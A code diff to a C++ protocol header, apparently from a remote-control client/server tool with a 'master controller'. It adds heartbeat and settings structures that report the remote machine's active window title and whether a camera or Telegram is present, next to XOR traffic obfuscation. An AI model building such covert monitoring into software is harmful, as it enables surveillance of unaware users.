@@ -202,6 +202,8 @@ enum
 
 	SOCKET_DLLLOADER=210,           // 客户端请求DLL
 	CMD_DLLDATA,                    // 响应DLL数据
+	CMD_MASTERSETTING = 215,		// 主控设置
+	CMD_HEARTBEAT_ACK = 216,		// 心跳回应
 };
 
 #define CLIENT_TYPE_DLL			0	// 客户端代码以DLL运行
@@ -269,6 +271,52 @@ typedef struct  LOGIN_INFOR
 		return *this;
 	}
 }LOGIN_INFOR;
+
+// 固定1024字节
+typedef struct Heartbeat
+{
+	uint64_t Time;
+	char ActiveWnd[512];
+	int Ping;
+	int HasSoftware;
+	char Reserved[496];
+
+	Heartbeat() {
+		memset(this, 0, sizeof(Heartbeat));
+	}
+	Heartbeat(const std::string& s, int ping = 0) {
+		auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
+			std::chrono::system_clock::now()
+			);
+		Time = system_ms.time_since_epoch().count();
+		strcpy_s(ActiveWnd, s.c_str());
+		Ping = ping;
+		memset(Reserved, 0, sizeof(Reserved));
+	}
+	int Size() const {
+		return sizeof(Heartbeat);
+	}
+}Heartbeat;
+
+typedef struct HeartbeatACK {
+	uint64_t Time;
+	char Reserved[24];
+}HeartbeatACK;
+
+// 固定500字节
+typedef struct MasterSettings {
+	int         ReportInterval;             // 上报间隔
+	int         Is64Bit;                    // 主控是否64位
+	char        MasterVersion[12];          // 主控版本
+	int			DetectSoftware;				// 检测软件
+	char        Reserved[476];              // 预留
+}MasterSettings;
+
+enum 
+{
+	SOFTWARE_CAMERA = 0,
+	SOFTWARE_TELEGRAM,
+};
 
 inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
 	for (char key : keys) {
